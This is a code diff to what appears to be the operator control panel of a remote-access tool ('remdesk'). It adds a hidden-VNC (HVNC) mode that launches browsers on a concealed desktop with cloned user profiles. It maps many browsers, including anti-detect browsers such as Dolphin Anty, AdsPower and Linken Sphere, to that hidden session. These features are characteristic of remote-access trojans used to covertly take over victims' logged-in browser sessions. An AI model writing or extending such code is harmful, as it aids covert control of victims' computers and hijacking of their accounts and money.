@@ -234,6 +234,46 @@
       remdesk.setAppStatus("Switch to manage mode to launch apps", "warn");
       return;
     }
+    
+    // In HVNC mode, launch app on HVNC desktop instead of main desktop
+    const isHvncMode = state.sessionMode === "hvnc";
+    
+    if (isHvncMode && remdesk.hvnc) {
+      // Check if HVNC is active
+      if (!remdesk.hvnc.state.active) {
+        remdesk.setAppStatus("Start HVNC first", "warn");
+        return;
+      }
+      
+      // Map app name to browser name for HVNC
+      const browserMap = {
+        "chrome": "chrome",
+        "firefox": "firefox",
+        "edge": "edge",
+        "opera": "opera",
+        "brave": "brave",
+        "safari": "chrome", // fallback
+        "samsung_internet": "chrome",
+        "uc_browser": "chrome",
+        "huawei_browser": "chrome",
+        "dolphin_anty": "chrome",
+        "octo": "chrome",
+        "adspower": "chrome",
+        "linken_sphere_2": "chrome"
+      };
+      
+      const hvncBrowser = browserMap[appName] || appName;
+      remdesk.setAppStatus(`Launching ${appName} on HVNC...`, "warn");
+      
+      // Send HVNC launch browser action
+      remdesk.hvnc.sendAction("launch_browser", { 
+        browser: hvncBrowser, 
+        clone_profile: true 
+      });
+      return;
+    }
+    
+    // Normal mode - launch on main desktop
     state.pendingAppLaunch = appName;
     remdesk.setAppStatus(`Launching ${appName}...`, "warn");
     await sendChannelPayload(
